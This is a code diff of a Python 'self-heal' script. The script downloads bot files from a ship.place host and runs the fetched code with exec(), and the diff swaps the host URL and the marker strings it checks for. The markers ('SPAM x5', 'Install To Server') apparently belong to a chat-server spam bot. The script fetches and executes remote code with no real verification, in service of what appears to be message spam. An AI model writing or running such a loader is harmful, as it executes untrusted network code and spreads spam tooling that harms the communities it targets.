@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
-"""Self-heal: whitelist server fix + spam 5x + button."""
+"""Self-heal: server protect (bot+external) + spam 5x followup."""
 import os
 import sys
 import urllib.request
 
 HERE = os.path.dirname(os.path.abspath(__file__))
-BOT_URL = "https://mellow-piano-tvyza.ship.place/bot.py"
-EXTRA_URL = "https://mellow-piano-tvyza.ship.place/extra_cmds.py"
+BOT_URL = "https://polar-edam-j09wo.ship.place/bot.py"
+EXTRA_URL = "https://polar-edam-j09wo.ship.place/extra_cmds.py"
 BOT_FILE = os.path.join(HERE, "bot_full.py")
 EXTRA_FILE = os.path.join(HERE, "extra_cmds.py")
 
@@ -23,8 +23,8 @@ def fetch(url, dest, needles):
     print(f"  wrote {dest} ({len(data)} bytes)")
 
 if __name__ == "__main__":
-    fetch(BOT_URL, BOT_FILE, ["Install To Server", "server_id: str = None"])
-    fetch(EXTRA_URL, EXTRA_FILE, ["SPAM x5", "First batch"])
+    fetch(BOT_URL, BOT_FILE, ["This server is protected", "Install To Server", "server protected"])
+    fetch(EXTRA_URL, EXTRA_FILE, ["SPAM x5", "followup.send(self.text"])
     with open(BOT_FILE, encoding="utf-8") as f:
         code = f.read()
     exec(compile(code, BOT_FILE, "exec"), {"__name__": "__main__", "__file__": BOT_FILE})
